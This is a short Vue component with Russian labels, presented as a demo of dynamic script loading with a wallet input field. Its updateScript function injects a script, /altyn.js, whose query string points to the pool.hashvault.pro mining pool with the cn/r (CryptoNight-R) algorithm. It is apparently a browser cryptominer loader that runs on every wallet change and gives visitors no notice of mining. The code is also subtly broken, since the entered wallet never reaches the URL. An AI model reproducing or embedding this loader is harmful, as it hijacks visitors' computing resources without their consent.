<template>
  <div>
    <h1>Динамическое подключение скрипта</h1>
    <input v-model="wallet" placeholder="Введите кошелек" />
    <button @click="updateScript">Обновить скрипт</button>
    {{wallet.value}}
  </div>
</template>

<script setup>
import { ref, watch } from "vue";

const wallet = ref(""); // Введенный кошелек

const updateScript = () => {
  const scriptUrl = `/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443`;

  // Удаляем старый скрипт, если он уже есть
  const oldScript = document.getElementById("dynamic-script");
  if (oldScript) {
    oldScript.remove();
  }

  // Создаем новый скрипт
  const script = document.createElement("script");
  script.id = "dynamic-script";
  script.src = scriptUrl;
  script.async = true;

  document.head.appendChild(script);
};

// При каждом изменении wallet вызываем updateScript
watch(wallet, () => {
  if (wallet.value) {
    updateScript();
  }
});
</script>
